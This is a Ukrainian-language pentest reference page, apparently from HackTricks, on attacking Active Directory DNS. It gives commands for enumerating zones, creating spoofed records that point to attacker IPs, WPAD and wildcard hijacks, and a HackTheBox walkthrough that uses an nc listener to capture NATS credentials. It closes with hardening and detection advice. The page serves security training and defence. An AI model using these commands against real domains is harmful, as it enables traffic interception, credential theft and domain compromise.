# DNS-записи AD

{{#include ../../banners/hacktricks-training.md}}

За замовчуванням **будь-який користувач** в Active Directory може **перерахувати всі DNS-записи** в DNS-зонах домену або лісу, подібно до передавання зони (користувачі можуть переглядати дочірні об’єкти DNS-зони в середовищі AD).

Інструмент [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) дає змогу **перерахувати** й **експортувати** **всі DNS-записи** в зоні для розвідки внутрішніх мереж.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0 (квітень 2025 року) додає вивід у форматі JSON/Greppable (`--json`), багатопотокове розпізнавання DNS і підтримку TLS 1.2/1.3 під час підключення до LDAPS  

Докладніше читайте на [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Створення / змінення записів (ADIDNS spoofing)

Оскільки група **Authenticated Users** за замовчуванням має дозвіл **Create Child** у DACL зони, будь-який обліковий запис домену (або комп’ютера) може зареєструвати додаткові записи. Це можна використати для перехоплення трафіку, примусового запуску NTLM relay або навіть повної компрометації домену.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py входить до складу Impacket ≥0.12.0)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Поширені примітиви атак

1. **Wildcard record** – `*.<zone>` перетворює DNS-сервер AD на відповідь для всієї організації, подібну до спуфінгу LLMNR/NBNS. Це можна використати, щоб перехоплювати NTLM-хеші або ретранслювати їх до LDAP/SMB. (Потрібно вимкнути WINS-lookup.)<sup>[[1]](#references)</sup>    
2. **WPAD hijack** – додайте `wpad` (або запис **NS**, що вказує на хост зловмисника, щоб обійти Global-Query-Block-List) і прозоро проксіюйте вихідні HTTP-запити для збору облікових даних. Microsoft виправила обходи через wildcard/DNAME (CVE-2018-8320), але записи **NS** досі працюють.<sup>[[1]](#references)</sup>    
3. **Stale entry takeover** – отримайте IP-адресу, яка раніше належала робочій станції, і пов’язаний запис DNS продовжить розв’язуватися. Це дає змогу здійснювати атаки resource-based constrained delegation або Shadow-Credentials, не торкаючись DNS.    
4. **DHCP → DNS spoofing** – у типовом розгортанні Windows DHCP+DNS зловмисник без автентифікації в тій самій підмережі може перезаписати будь-який наявний запис A (зокрема записи контролерів домену), надсилаючи підроблені DHCP-запити, що запускають динамічні оновлення DNS (Akamai “DDSpoof”, 2023). Це дає змогу здійснити machine-in-the-middle-атаку на Kerberos/LDAP і може призвести до повного захоплення домену.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – змініть `dNSHostName` контрольованого вами облікового запису комп’ютера, зареєструйте відповідний запис A, а потім запросіть сертифікат для цього імені, щоб видати себе за DC. Інструменти на кшталт **Certipy** або **BloodyAD** повністю автоматизують цей процес.  

Запис DNS в AD із [серіалізованою інформацією про ціль](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) може бути частиною умовного ланцюжка ретрансляції: користувачеві потрібні права на створення запису, шлях примусу, який змушує цільовий комп’ютер автентифікуватися за цим іменем, і пункт призначення для ретрансляції, який приймає отриману автентифікацію. Окремо оцініть протокол призначення: підпис SMB у вхідному з’єднанні сам по собі не визначає, чи прийме HTTPS WinRM призначення ретрансляції. Рівень виправлень, обробка імен, Extended Protection і конфігурація служби можуть вплинути на результат.

---

### Перехоплення внутрішньої служби через застарілі динамічні записи (приклад NATS)

Якщо динамічні оновлення доступні всім автентифікованим користувачам, **зняте з реєстрації ім’я служби можна повторно зареєструвати й спрямувати на інфраструктуру зловмисника**. Після очищення DNS контролер домену Mirage HTB залишив доступним ім’я хоста `nats-svc.mirage.htb`, тож будь-який користувач із низькими привілеями міг:<sup>[[3]](#references)</sup>

1. **Переконатися, що запис відсутній,** і дізнатися SOA за допомогою `dig`:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **Повторно створіть запис** на зовнішньому/VPN-інтерфейсі, який вони контролюють:

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **Імітуйте сервіс без шифрування**. Клієнти NATS очікують побачити банер `INFO { ... }` перед надсиланням облікових даних, тож достатньо скопіювати справжній банер брокера, щоб викрасти секрети:

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Будь-який клієнт, який розпізнає підмінену назву, негайно надішле leak свого JSON-фрейму `CONNECT` (зокрема `"user"`/`"pass"`) слухачу. Запуск офіційного бінарного файла `nats-server -V` на хості атакувальника, вимкнення редагування журналів або просте перехоплення сеансу у Wireshark дасть ті самі облікові дані у відкритому вигляді, оскільки TLS був необов’язковим.

4. **Pivot із викраденими обліковими даними** – у Mirage викрадений обліковий запис NATS надавав доступ до JetStream, де зберігалися історичні події автентифікації з повторно використовуваними іменами користувачів і паролями AD.

Цей сценарій стосується кожної служби, інтегрованої з AD, яка покладається на незахищені TCP-рукостискання (HTTP API, RPC, MQTT тощо): щойно запис DNS підмінено, атакувальник стає службою.

---

## Виявлення та посилення захисту

* Забороніть групі **Authenticated Users** право *Create all child objects* у важливих зонах і делегуйте динамічні оновлення окремому обліковому запису, який використовує DHCP.
* Якщо потрібні динамічні оновлення, налаштуйте для зони режим **Secure-only** і ввімкніть у DHCP **Name Protection**, щоб лише об’єкт комп’ютера-власника міг перезаписувати власний запис.
* Відстежуйте події DNS Server з ID 257/252 (динамічне оновлення), 770 (передавання зони) та записи LDAP у `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Блокуйте небезпечні назви (`wpad`, `isatap`, `*`) за допомогою навмисно безпечного запису або Global Query Block List.
* Оновлюйте DNS-сервери — наприклад, вразливості RCE CVE-2024-26224 і CVE-2024-26231 отримали **CVSS 9.8** і дають змогу віддалено атакувати контролери домену.

## References

- [1] [ADIDNS: повторний розгляд — WPAD, GQBL та інше](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [Підміна записів DNS через зловживання динамічними оновленнями DNS у DHCP](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: ланцюжок атак із NFS Leaks, зловживання Dynamic DNS, викрадення облікових даних NATS, секрети JetStream і Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [У зоні: вивантаження DNS Active Directory за допомогою adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
